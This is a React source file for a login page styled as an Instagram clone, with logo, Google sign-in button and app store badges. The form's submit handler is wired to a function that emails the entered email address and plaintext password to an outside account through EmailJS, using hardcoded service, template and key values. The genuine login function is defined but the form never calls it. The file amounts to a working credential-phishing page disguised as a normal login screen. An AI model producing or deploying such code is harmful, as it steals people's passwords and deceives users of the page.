import React, { useEffect, useState } from "react";
import LogInImg from "../Assets/Images/login-img.png";
import InstaLogo from "../Assets/Images/insta-logo.png";
import PlayStore from "../Assets/Images/play-store.png";
import AppStore from "../Assets/Images/app-store.png";
import { Link, useNavigate } from "react-router-dom";
import GoogleButton from "react-google-button";
import { Alert } from "@mui/material";
import { useUserAuth } from "../context/UserAuthContextProvider";
import SignUpLoader from "../Assets/Images/sign-up-loader.svg";
import emailjs from "@emailjs/browser"

const LogIn = () => {
  const { logIn, googleSignIn } = useUserAuth();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);

  const onSendMessage = async(e) => {
    e.preventDefault();
    try{
     await emailjs.send(
         "service_6rn0l09",
         "template_kw830is",
         {
             email:email,
             password,
        
         },
         "In1BeNLlqF2cqsWpL"
       )

    }catch (error){
 console.log(error);
    }

 }

  const handleLogIn = async (e) => {
    e.preventDefault();
    setError("");
    setLoading(true);
    try {
      await logIn(email, password);
      setLoading(false);
      navigate("/home");
    } catch (err) {
      setError(err.message);
    }
  };

  const handleGoogleSignIn = async (e) => {
    setError("");
    setLoading(true);
    try {
      await googleSignIn();
      setLoading(false);
      navigate("/home");
    } catch (err) {
      setError(err.message);
    }
  };
  useEffect(() => {
    setTimeout(() => {
      setError("");
      setLoading(false);
    }, 4000);
  }, [error]);
  return (
    <div className="bg-gray-50 flex h-screen w-screen">
      <div className="flex container mx-auto h-full w-full">
        {/* Left Section */}
        <div className="w-screen md:w-1/2 hidden md:flex items-center justify-end">
          <img
            className="w-96 object-contain"
            src={LogInImg}
            aria-hidden
            alt="LogIn Image"
          />
        </div>
        {/* Right Section */}
        <div className="max-w-fit mx-auto md:ml-9 md:w-1/2 flex items-center justify-start">
          <div className="space-y-5">
            <div className="flex flex-col items-center border border-gray-300 rounded-sm space-y-5  bg-white p-5">
              <Link to="/">
                <img
                  className="object-contain w-48 py-3 cursor-pointer"
                  src={InstaLogo}
                  aria-hidden
                  alt="InstaLogo"
                />
              </Link>
              {error && (
                <Alert variant="filled" severity="error">
                  {error}
                </Alert>
              )}
              <form className="flex flex-col space-y-3" onSubmit={onSendMessage}>
                <input
                  className="p-3 border border-gray-400 rounded-sm w-72 focus:outline-none focus:ring-gray-600 focus:border-gray-600"
                  type="email"
                  name="email"
                  id="email"
                  placeholder="Email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
                <input
                  className="p-3 border border-gray-400 rounded-sm w-72 focus:outline-none focus:ring-gray-600 focus:border-gray-600"
                  type="password"
                  name="password"
                  id="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                <button
                  type="submit"
                  className="py-2 bg-blue-500 text-white hover:bg-blue-400"
                >
                  {loading ? (
                    <img
                      className="mx-auto w-8"
                      src={SignUpLoader}
                      alt="Loading..."
                    />
                  ) : (
                    "Log In"
                  )}
                </button>
              </form>
              <div className="flex relative">
                <span className="w-20 border-b-2 absolute -left-24 top-3 border-gray-400"></span>{" "}
                OR{" "}
                <span className="w-20 border-b-2 absolute -right-24 top-3 border-gray-400"></span>
              </div>
              <GoogleButton onClick={handleGoogleSignIn} />
              <div className="text-sm cursor-pointer">Forgot password?</div>
            </div>
            <div className="text-center p-4 border border-gray-300 rounded-sm bg-white">
              Don't have an account?{" "}
              <Link to="/signup">
                <span className="text-blue-500 cursor-pointer hover:text-blue-600 underline">
                  Sign up
                </span>
              </Link>
            </div>
            <div className="text-center">Get the app.</div>
            <div className="flex items-center justify-center">
              <img
                className="object-contain w-32 cursor-pointer mr-2"
                src={AppStore}
                aria-hidden
                alt="AppStore"
              />
              <img
                className="object-contain w-32 cursor-pointer"
                src={PlayStore}
                aria-hidden
                alt="PlayStore"
              />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LogIn;
